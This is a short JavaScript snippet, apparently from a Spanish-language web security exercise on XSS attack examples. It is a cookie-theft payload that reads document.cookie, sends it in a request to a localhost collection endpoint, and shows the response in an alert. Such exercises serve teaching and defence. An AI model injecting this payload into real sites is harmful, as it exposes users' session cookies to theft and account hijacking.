xmlhttp = new XMLHttpRequest();
xmlhttp.open("get", "http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/peticion_inocua?galletas="+document.cookie,false);
xmlhttp.send(null);
str1=xmlhttp.responseText;
alert(str1);


